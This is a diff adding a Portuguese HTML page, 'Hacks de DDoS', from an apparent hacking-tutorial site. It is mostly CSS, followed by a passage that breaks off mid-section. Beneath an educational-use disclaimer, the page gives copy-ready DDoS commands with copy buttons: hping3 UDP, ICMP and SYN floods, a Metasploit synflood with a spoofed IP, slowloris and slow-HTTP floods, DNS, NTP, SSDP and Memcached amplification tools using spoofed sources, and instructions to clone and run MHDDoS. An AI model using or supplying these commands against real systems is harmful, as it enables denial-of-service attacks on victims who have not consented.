@@ -1,0 +1,2213 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacks de DDoS - CyberHack</title>
+    
+    <link rel="icon" href="r.png" type="image/x-icon" />
+    <link rel="shortcut icon" href="r.png" type="image/x-icon" />
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rajdhani', 'Courier New', monospace;
+            color: #fff;
+            user-select: none;
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;400;500;600;700&display=swap');
+
+        body {
+            background-color: #000000;
+            overflow-x: hidden;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        #canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
+
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 0 20px;
+            position: relative;
+            z-index: 10;
+        }
+
+        header {
+            padding: 20px 0;
+            position: relative;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 105, 180, 0.3);
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: 700;
+            color: #ff69b4;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            text-shadow: 0 0 10px rgba(255, 105, 180, 0.5);
+        }
+
+        .logo::before {
+            content: '';
+            display: inline-block;
+            width: 15px;
+            height: 15px;
+            background-color: #ff69b4;
+            margin-right: 10px;
+            box-shadow: 0 0 10px #ff69b4, 0 0 20px #ff69b4;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.7; }
+            50% { opacity: 1; transform: scale(1.2); }
+            100% { opacity: 0.7; }
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 20px;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.8);
+            position: relative;
+            transition: color 0.3s;
+        }
+        
+        .home-btn {
+            background: linear-gradient(45deg, #ff1493, #ff69b4);
+            padding: 8px 15px;
+            border-radius: 5px;
+            color: #fff !important;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 3px 10px rgba(255, 20, 147, 0.4);
+            transition: all 0.3s ease !important;
+        }
+        
+        .home-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.6);
+            color: #fff !important;
+        }
+        
+        .home-btn::after {
+            display: none;
+        }
+
+        .nav-links a:hover {
+            color: #ff69b4;
+        }
+
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #ff69b4, transparent);
+            transition: width 0.3s ease;
+        }
+
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+
+        .page-title {
+            text-align: center;
+            margin-bottom: 50px;
+            position: relative;
+        }
+
+        .page-title h1 {
+            font-size: 48px;
+            font-weight: 700;
+            color: #ff69b4;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            position: relative;
+            display: inline-block;
+        }
+
+        .page-title h1::before,
+        .page-title h1::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .page-title h1::before {
+            left: 2px;
+            text-shadow: -1px 0 #00ffea;
+            animation: glitch-before 3s infinite alternate-reverse;
+            opacity: 0.3;
+        }
+
+        .page-title h1::after {
+            left: -2px;
+            text-shadow: 1px 0 #ff00c1;
+            animation: glitch-after 2s infinite alternate-reverse;
+            opacity: 0.3;
+        }
+
+        @keyframes glitch-before {
+            0% { clip-path: inset(0 0 0 0); }
+            5% { clip-path: inset(30% 0 25% 0); }
+            15% { clip-path: inset(0 0 0 0); }
+            100% { clip-path: inset(0 0 0 0); }
+        }
+
+        @keyframes glitch-after {
+            0% { clip-path: inset(0 0 0 0); }
+            5% { clip-path: inset(10% 0 40% 0); }
+            15% { clip-path: inset(0 0 0 0); }
+            100% { clip-path: inset(0 0 0 0); }
+        }
+
+        .content-section {
+            margin-bottom: 60px;
+            background: rgba(15, 15, 15, 0.7);
+            border-radius: 15px;
+            padding: 30px;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .content-section::before {
+            content: '';
+            position: absolute;
+            top: -150%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 105, 180, 0.1), transparent);
+            transform: rotate(25deg);
+            animation: glare 7s linear infinite;
+            pointer-events: none;
+        }
+
+        @keyframes glare {
+            0% { transform: translateX(-100%) rotate(25deg); }
+            100% { transform: translateX(100%) rotate(25deg); }
+        }
+
+        .section-title {
+            font-size: 28px;
+            font-weight: 600;
+            color: #ff69b4;
+            margin-bottom: 20px;
+            position: relative;
+            display: inline-block;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, #ff69b4, transparent);
+        }
+
+        .content-section p {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .alert-box {
+            background: rgba(220, 53, 69, 0.2);
+            border-left: 4px solid #dc3545;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+        }
+
+        .alert-box.warning {
+            background: rgba(255, 193, 7, 0.2);
+            border-left: 4px solid #ffc107;
+        }
+
+        .alert-box.info {
+            background: rgba(0, 123, 255, 0.2);
+            border-left: 4px solid #007bff;
+        }
+
+        .alert-box p {
+            margin-bottom: 0;
+        }
+
+        .tool-card {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .tool-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(255, 20, 147, 0.2);
+            border-color: rgba(255, 105, 180, 0.6);
+        }
+
+        .tool-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .tool-icon {
+            width: 50px;
+            height: 50px;
+            background: rgba(255, 105, 180, 0.2);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-right: 15px;
+        }
+
+        .tool-icon i {
+            font-size: 24px;
+            color: #ff69b4;
+        }
+
+        .tool-name {
+            font-size: 22px;
+            font-weight: 600;
+            color: #ff69b4;
+        }
+
+        .tool-description {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+
+        .cmd-block {
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-left: 3px solid #ff69b4;
+            font-family: 'Courier New', monospace;
+            position: relative;
+            overflow-x: auto;
+        }
+
+        .cmd-block pre {
+            margin: 0;
+            font-size: 14px;
+            color: #00ff00;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .cmd-output {
+            background: rgba(50, 50, 50, 0.7);
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-left: 3px solid #00ccff;
+            font-family: 'Courier New', monospace;
+            position: relative;
+            overflow-x: auto;
+        }
+
+        .cmd-output pre {
+            margin: 0;
+            font-size: 14px;
+            color: #ffffff;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background: rgba(255, 105, 180, 0.3);
+            border: none;
+            border-radius: 3px;
+            color: #fff;
+            padding: 5px 10px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .copy-btn:hover {
+            background: rgba(255, 105, 180, 0.5);
+        }
+
+        .tool-features {
+            margin-bottom: 15px;
+        }
+
+        .feature-list {
+            list-style-type: none;
+        }
+
+        .feature-list li {
+            position: relative;
+            padding-left: 25px;
+            margin-bottom: 8px;
+            font-size: 15px;
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        .feature-list li::before {
+            content: '→';
+            position: absolute;
+            left: 0;
+            color: #ff69b4;
+        }
+
+        .info-list {
+            list-style-type: none;
+            margin-bottom: 20px;
+        }
+
+        .info-list li {
+            position: relative;
+            padding-left: 25px;
+            margin-bottom: 10px;
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.9);
+            line-height: 1.5;
+        }
+
+        .info-list li::before {
+            content: '•';
+            position: absolute;
+            left: 0;
+            color: #ff69b4;
+            font-size: 20px;
+        }
+
+        .tab-container {
+            margin-bottom: 30px;
+        }
+
+        .tabs {
+            display: flex;
+            overflow-x: auto;
+            border-bottom: 1px solid rgba(255, 105, 180, 0.3);
+            margin-bottom: 20px;
+        }
+
+        .tab-btn {
+            padding: 10px 20px;
+            background: transparent;
+            border: none;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            white-space: nowrap;
+        }
+
+        .tab-btn.active {
+            color: #ff69b4;
+            border-bottom: 2px solid #ff69b4;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .attack-type {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .attack-type:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(255, 20, 147, 0.2);
+            border-color: rgba(255, 105, 180, 0.6);
+        }
+
+        .attack-name {
+            font-size: 22px;
+            font-weight: 600;
+            color: #ff69b4;
+            margin-bottom: 15px;
+        }
+
+        .attack-description {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+
+        .attack-details {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+
+        .attack-details h4 {
+            font-size: 18px;
+            color: #ff69b4;
+            margin-bottom: 10px;
+        }
+
+        .defense-method {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(0, 255, 191, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .defense-method:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 255, 191, 0.2);
+            border-color: rgba(0, 255, 191, 0.6);
+        }
+
+        .defense-name {
+            font-size: 22px;
+            font-weight: 600;
+            color: #00ffbf;
+            margin-bottom: 15px;
+        }
+
+        .defense-description {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 20px;
+        }
+
+        .comparison-table th,
+        .comparison-table td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid rgba(255, 105, 180, 0.3);
+        }
+
+        .comparison-table th {
+            background: rgba(255, 105, 180, 0.1);
+            color: #ff69b4;
+            font-weight: 600;
+        }
+
+        .comparison-table tr:hover {
+            background: rgba(255, 105, 180, 0.05);
+        }
+
+        .progress-container {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            height: 30px;
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #ff1493, #ff69b4);
+            border-radius: 10px;
+            transition: width 0.3s ease;
+            position: relative;
+        }
+
+        .progress-label {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #fff;
+            font-weight: 600;
+            z-index: 1;
+            text-shadow: 0 0 5px rgba(0, 0, 0, 0.7);
+        }
+
+        .toc {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            position: sticky;
+            top: 20px;
+        }
+
+        .toc-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #ff69b4;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .toc-list {
+            list-style-type: none;
+        }
+
+        .toc-list li {
+            margin-bottom: 10px;
+        }
+
+        .toc-list a {
+            color: rgba(255, 255, 255, 0.9);
+            text-decoration: none;
+            transition: all 0.3s ease;
+            display: inline-block;
+            position: relative;
+            padding-left: 15px;
+        }
+
+        .toc-list a:hover {
+            color: #ff69b4;
+            transform: translateX(5px);
+        }
+
+        .toc-list a::before {
+            content: '→';
+            position: absolute;
+            left: 0;
+            color: #ff69b4;
+        }
+
+        .two-column {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        @media (max-width: 992px) {
+            .two-column {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .terminal-window {
+            background: #1e1e1e;
+            border-radius: 10px;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            overflow: hidden;
+        }
+
+        .terminal-header {
+            display: flex;
+            align-items: center;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            margin-bottom: 10px;
+        }
+
+        .terminal-btn {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+
+        .terminal-btn-red {
+            background-color: #ff5f56;
+        }
+
+        .terminal-btn-yellow {
+            background-color: #ffbd2e;
+        }
+
+        .terminal-btn-green {
+            background-color: #27c93f;
+        }
+
+        .terminal-title {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 12px;
+            margin-left: 10px;
+        }
+
+        .terminal-body {
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            color: #00ff00;
+            height: 300px;
+            overflow-y: auto;
+            padding: 10px;
+        }
+
+        .terminal-line {
+            margin-bottom: 5px;
+            line-height: 1.5;
+        }
+
+        .terminal-prompt {
+            color: #ff69b4;
+        }
+
+        .terminal-command {
+            color: #00ff00;
+        }
+
+        .terminal-output {
+            color: #ffffff;
+        }
+
+        .blinking-cursor {
+            display: inline-block;
+            width: 10px;
+            height: 20px;
+            background-color: #00ff00;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 49% { opacity: 1; }
+            50%, 100% { opacity: 0; }
+        }
+
+        .digital-numbers {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            font-family: monospace;
+            font-size: 12px;
+            color: #ff69b4;
+            opacity: 0.7;
+            pointer-events: none;
+            z-index: 100;
+        }
+
+        #random-numbers {
+            animation: flicker 0.5s infinite alternate;
+        }
+
+        @keyframes flicker {
+            0% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+
+        #top-btn {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 50px;
+            height: 50px;
+            background: rgba(255, 105, 180, 0.3);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            text-decoration: none;
+            font-size: 24px;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 99;
+        }
+
+        #top-btn.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        #top-btn:hover {
+            background: rgba(255, 105, 180, 0.6);
+            transform: translateY(-5px);
+        }
+
+        footer {
+            padding: 40px 0;
+            border-top: 1px solid rgba(255, 105, 180, 0.3);
+            position: relative;
+            margin-top: 80px;
+        }
+
+        .footer-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .footer-logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: #ff69b4;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 30px;
+        }
+
+        .footer-links a {
+            color: rgba(255, 255, 255, 0.7);
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: #ff69b4;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 15px;
+        }
+
+        .social-links a {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: rgba(255, 105, 180, 0.1);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            color: #ff69b4;
+            font-size: 18px;
+            transition: all 0.3s ease;
+        }
+
+        .social-links a:hover {
+            background: rgba(255, 105, 180, 0.2);
+            transform: translateY(-3px);
+            border-color: rgba(255, 105, 180, 0.6);
+        }
+
+        @media (max-width: 992px) {
+            .footer-container {
+                flex-direction: column;
+                gap: 20px;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <canvas id="canvas"></canvas>
+    <div class="container">
+        <header>
+            <div class="logo">CyberHack</div>
+            <nav class="nav-links">
+                <a href="index.html" class="home-btn"><i class="fas fa-home"></i> Home</a>
+                <a href="#introducao">Introdução</a>
+                <a href="#tipos">Tipos de DDoS</a>
+                <a href="#ferramentas">Ferramentas</a>
+                <a href="#defesa">Defesa</a>
+                <a href="#legal">Aspectos Legais</a>
+            </nav>
+        </header>
+
+        <div class="page-title">
+            <h1 data-text="Hacks de DDoS">Hacks de DDoS</h1>
+        </div>
+
+        <div class="alert-box">
+            <p><strong>AVISO IMPORTANTE:</strong> Este conteúdo é fornecido APENAS para fins educacionais. A execução de ataques DDoS sem autorização explícita é ILEGAL em praticamente todos os países e pode resultar em processos criminais. Utilize estes conhecimentos apenas em ambientes controlados e com as devidas autorizações.</p>
+        </div>
+
+        <div class="two-column">
+            <div class="content-sections">
+                <section id="introducao" class="content-section">
+                    <h2 class="section-title">O que é um ataque DDoS?</h2>
+                    <p>DDoS (Distributed Denial of Service) é um tipo de ataque cibernético que visa tornar um serviço, site ou rede indisponível, sobrecarregando-o com tráfego malicioso proveniente de múltiplas fontes.</p>
+                    
+                    <p>Ao contrário de um ataque DoS (Denial of Service) simples, que utiliza uma única fonte para gerar tráfego, ataques DDoS empregam múltiplos sistemas comprometidos (geralmente uma botnet) para amplificar significativamente a potência do ataque.</p>
+                    
+                    <div class="terminal-window">
+                        <div class="terminal-header">
+                            <div class="terminal-btn terminal-btn-red"></div>
+                            <div class="terminal-btn terminal-btn-yellow"></div>
+                            <div class="terminal-btn terminal-btn-green"></div>
+                            <div class="terminal-title">Anatomia de um ataque DDoS</div>
+                        </div>
+                        <div class="terminal-body">
+                            <div class="terminal-line">
+                                <span class="terminal-prompt">hacker@cyberhack:~$</span> 
+                                <span class="terminal-command">echo "Anatomia de um ataque DDoS"</span>
+                            </div>
+                            <div class="terminal-line terminal-output">
+                                Anatomia de um ataque DDoS
+                            </div>
+                            <div class="terminal-line">
+                                <span class="terminal-prompt">hacker@cyberhack:~$</span> 
+                                <span class="terminal-command">cat ddos_components.txt</span>
+                            </div>
+                            <div class="terminal-line terminal-output">
+                                1. Atacante (Controla a botnet)
+                                2. Botnet (Rede de dispositivos comprometidos)
+                                3. Amplificadores (Servidores que multiplicam o tráfego)
+                                4. Vítima (Alvo do ataque)
+                                5. Métodos de Ataque (Layer 3/4, Layer 7, etc.)
+                            </div>
+                            <div class="terminal-line">
+                                <span class="terminal-prompt">hacker@cyberhack:~$</span> 
+                                <span class="terminal-command">cat ddos_impact.txt</span>
+                            </div>
+                            <div class="terminal-line terminal-output">
+                                - Indisponibilidade de serviços
+                                - Saturação de banda
+                                - Esgotamento de recursos (CPU, memória, etc.)
+                                - Falha de sistemas de firewall e balanceadores
+                                - Danos à reputação e perdas financeiras
+                            </div>
+                            <div class="terminal-line">
+                                <span class="terminal-prompt">hacker@cyberhack:~$</span> 
+                                <span class="terminal-command">_</span>
+                                <span class="blinking-cursor"></span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <p>Os ataques DDoS modernos podem atingir volumes impressionantes, com alguns dos maiores ataques registrados superando 2 Tbps (Terabits por segundo) de tráfego, o suficiente para derrubar praticamente qualquer infraestrutura não preparada.</p>
+                </section>
+
+                <section id="tipos" class="content-section">
+                    <h2 class="section-title">Tipos de Ataques DDoS</h2>
+                    <p>Os ataques DDoS podem ser classificados em diferentes categorias, cada um com características e métodos específicos.</p>
+                    
+                    <div class="tab-container">
+                        <div class="tabs">
+                            <button class="tab-btn active" data-tab="volumetrico">Volumétricos</button>
+                            <button class="tab-btn" data-tab="protocolo">Protocolo</button>
+                            <button class="tab-btn" data-tab="aplicacao">Aplicação</button>
+                            <button class="tab-btn" data-tab="amplificacao">Amplificação</button>
+                            <button class="tab-btn" data-tab="hibrido">Híbridos</button>
+                        </div>
+                        
+                        <div id="volumetrico" class="tab-content active">
+                            <div class="attack-type">
+                                <h3 class="attack-name">Ataques Volumétricos</h3>
+                                <p class="attack-description">Visam consumir toda a largura de banda disponível entre a vítima e a internet, saturando a rede com tráfego aparentemente legítimo.</p>
+                                
+                                <div class="attack-details">
+                                    <h4>UDP Flood</h4>
+                                    <p>Envia um grande número de pacotes UDP para portas aleatórias no servidor alvo, forçando-o a verificar aplicações nas portas e responder com pacotes ICMP "Destination Unreachable" quando nenhuma aplicação é encontrada.</p>
+                                    
+                                    <div class="cmd-block">
+                                        <pre>hping3 --udp -p 53 --flood -d 1000 [IP-ALVO]</pre>
+                                        <button class="copy-btn">Copiar</button>
+                                    </div>
+                                    
+                                    <p>Este comando utiliza a ferramenta hping3 para gerar um flood UDP direcionado à porta 53 (DNS) com pacotes de 1000 bytes.</p>
+                                </div>
+                                
+                                <div class="attack-details">
+                                    <h4>ICMP Flood (Ping Flood)</h4>
+                                    <p>Sobrecarrega o alvo com pacotes ICMP Echo Request (ping), consumindo largura de banda e recursos de processamento.</p>
+                                    
+                                    <div class="cmd-block">
+                                        <pre>hping3 --icmp --flood -d 1500 [IP-ALVO]</pre>
+                                        <button class="copy-btn">Copiar</button>
+                                    </div>
+                                    
+                                    <p>Este comando gera um flood de pacotes ICMP com tamanho de 1500 bytes para o alvo.</p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div id="protocolo" class="tab-content">
+                            <div class="attack-type">
+                                <h3 class="attack-name">Ataques de Protocolo</h3>
+                                <p class="attack-description">Exploram vulnerabilidades em protocolos de rede, consumindo recursos de servidores ou equipamentos intermediários como firewalls e balanceadores.</p>
+                                
+                                <div class="attack-details">
+                                    <h4>SYN Flood</h4>
+                                    <p>Envia um grande número de pacotes TCP SYN, mas não responde aos SYN-ACK, deixando conexões "meio-abertas" que consomem recursos do servidor.</p>
+                                    
+                                    <div class="cmd-block">
+                                        <pre>hping3 -S --flood -V -p 80 [IP-ALVO]</pre>
+                                        <button class="copy-btn">Copiar</button>
+                                    </div>
+                                    
+                                    <p>Este comando realiza um SYN flood na porta 80 (HTTP) com visualização detalhada (-V).</p>
+                                    
+                                    <div class="cmd-block">
+                                        <pre>msfconsole -q
+use auxiliary/dos/tcp/synflood
+set RHOST [IP-ALVO]
+set RPORT 443
+set SHOST [IP-SPOOFADO]
+run</pre>
+                                        <button class="copy-btn">Copiar</button>
+                                    </div>
+                                    
+                                    <p>Este script do Metasploit executa um ataque SYN Flood mais sofisticado com spoofing de IP.</p>
+                                </div>
+                                
+                                <div class="attack-details">
+                                    <h4>TCP Fragmentation</h4>
+                                    <p>Envia pacotes TCP fragmentados que a vítima precisa remontar, consumindo recursos de memória e processamento.</p>
+                                    
+                                    <div class="cmd-block">
+                                        <pre>hping3 --flood -f -p 80 [IP-ALVO]</pre>
+                                        <button class="copy-btn">Copiar</button>
+                                    </div>
+                                    
+                                    <p>O parâmetro -f fragmenta os pacotes enviados ao alvo.</p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div id="aplicacao" class="tab-content">
+                            <div class="attack-type">
+                                <h3 class="attack-name">Ataques de Camada de Aplicação</h3>
+                                <p class="attack-description">Miram vulnerabilidades específicas em aplicativos web ou servidores, utilizando requisições aparentemente legítimas mas em volumes anormais.</p>
+                                
+                                <div class="attack-details">
+                                    <h4>HTTP/HTTPS Flood</h4>
+                                    <p>Bombardeia o servidor web com um grande número de requisições GET ou POST legítimas, esgotando sua capacidade de processamento.</p>
+                                    
+                                    <div class="cmd-block">
+                                        <pre>ab -n 1000000 -c 1000 http://[SITE-ALVO]/</pre>
+                                        <button class="copy-btn">Copiar</button>
+                                    </div>
+                                    
+                                    <p>Apache Benchmark (ab) realiza 1 milhão de requisições com 1000 conexões concorrentes.</p>
+                                    
+                                    <div class="cmd-block">
+                                        <pre>wrk -t10 -c500 -d60s http://[SITE-ALVO]/</pre>
+                                        <button class="copy-btn">Copiar</button>
+                                    </div>
+                                    
+                                    <p>Utiliza a ferramenta wrk com 10 threads, 500 conexões simultâneas por 60 segundos.</p>
+                                    
+                                    <div class="cmd-block">
+                                        <pre>python3 slowloris.py [SITE-ALVO] -s 1000 -v</pre>
+                                        <button class="copy-btn">Copiar</button>
+                                    </div>
+                                    
+                                    <p>Slowloris é um ataque que mantém conexões HTTP abertas por longos períodos. Este comando abre 1000 sockets simultâneos.</p>
+                                </div>
+                                
+                                <div class="attack-details">
+                                    <h4>Slow HTTP Attacks</h4>
+                                    <p>Estabelece conexões HTTP com o servidor alvo e envia dados muito lentamente, mantendo as conexões abertas por longos períodos.</p>
+                                    
+                                    <div class="cmd-block">
+                                        <pre>slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://[SITE-ALVO]/ -x 24 -p 3</pre>
+                                        <button class="copy-btn">Copiar</button>
+                                    </div>
+                                    
+                                    <p>Este comando executa um ataque Slow Headers com 1000 conexões, aumentando em 200 por segundo.</p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div id="amplificacao" class="tab-content">
+                            <div class="attack-type">
+                                <h3 class="attack-name">Ataques de Amplificação/Reflexão</h3>
+                                <p class="attack-description">Exploram serviços que produzem respostas maiores que as requisições, amplificando o volume do ataque, frequentemente com IP falsificado (spoofed).</p>
+                                
+                                <div class="attack-details">
+                                    <h4>DNS Amplification</h4>
+                                    <p>Envia consultas DNS com IP de origem falsificado para servidores DNS recursivos abertos, gerando respostas muito maiores que são enviadas à vítima.</p>
+                                    
+                                    <div class="cmd-block">
+                                        <pre>dnsdrdos -s [IP-SPOOFADO] -t [IP-ALVO] -d dominio.com -l dns_servers.txt</pre>
+                                        <button class="copy-btn">Copiar</button>
+                                    </div>
+                                    
+                                    <p>Esta ferramenta automatiza ataques de amplificação DNS, utilizando uma lista de servidores DNS abertos.</p>
+                                </div>
+                                
+                                <div class="attack-details">
+                                    <h4>NTP Amplification</h4>
+                                    <p>Explora o comando monlist do protocolo NTP, que pode gerar respostas até 556 vezes maiores que a consulta original.</p>
+                                    
+                                    <div class="cmd-block">
+                                        <pre>ntpdos.py -t [IP-ALVO] -l ntp_servers.txt</pre>
+                                        <button class="copy-btn">Copiar</button>
+                                    </div>
+                                    
+                                    <p>Este script Python explora servidores NTP vulneráveis para realizar ataques de amplificação.</p>
+                                </div>
+                                
+                                <div class="attack-details">
+                                    <h4>SSDP Amplification</h4>
+                                    <p>Utiliza dispositivos compatíveis com SSDP (Simple Service Discovery Protocol) para gerar respostas amplificadas.</p>
+                                    
+                                    <div class="cmd-block">
+                                        <pre>saddam -t [IP-ALVO] -f ssdp.txt</pre>
+                                        <button class="copy-btn">Copiar</button>
+                                    </div>
+                                    
+                                    <p>Saddam é uma ferramenta para realizar ataques de amplificação SSDP, Memcached e outros.</p>
+                                </div>
+                                
+                                <div class="attack-details">
+                                    <h4>Memcached Amplification</h4>
+                                    <p>Um dos ataques de amplificação mais potentes, com fator de amplificação de até 51.000x, explorando servidores Memcached expostos.</p>
+                                    
+                                    <div class="cmd-block">
+                                        <pre>sudo python3 memcached.py [IP-SPOOFADO] [IP-ALVO] [PORTA-ALVO] [LISTA-SERVIDORES] [NÚMERO-THREADS]</pre>
+                                        <button class="copy-btn">Copiar</button>
+                                    </div>
+                                    
+                                    <p>Este script Python explora servidores Memcached vulneráveis para executar ataques massivos.</p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div id="hibrido" class="tab-content">
+                            <div class="attack-type">
+                                <h3 class="attack-name">Ataques Híbridos e Multi-Vetor</h3>
+                                <p class="attack-description">Combinam múltiplas técnicas de ataque simultaneamente, dificultando a mitigação por usar diferentes vetores.</p>
+                                
+                                <div class="attack-details">
+                                    <h4>Multi-vetorial com MHDDoS</h4>
+                                    <p>MHDDoS é uma ferramenta avançada que permite ataques DDoS multi-vetor, combinando diferentes técnicas.</p>
+                                    
+                                    <div class="cmd-block">
+                                        <pre>git clone https://github.com/MatrixTM/MHDDoS.git
+cd MHDDoS
+pip3 install -r requirements.txt
+python3 start.py TCP [IP-ALVO] [PORTA] 8 1024 socks5.txt 100 100</pre>
+                                        <button class="copy-btn">Copiar</button>
+                                    </div>
+                                    
+                                    <p>Este exemplo utiliza ataque TCP com 8 threads, 1024 bytes por pacote, lista de proxies SOCKS5, 100 conexões por proxy e 100 segundos de duração.</p>
+                                </div>
+                                
+                                <div class="attack-details">
+                                    <h4>Combinação de Layer 4 e 7</h4>
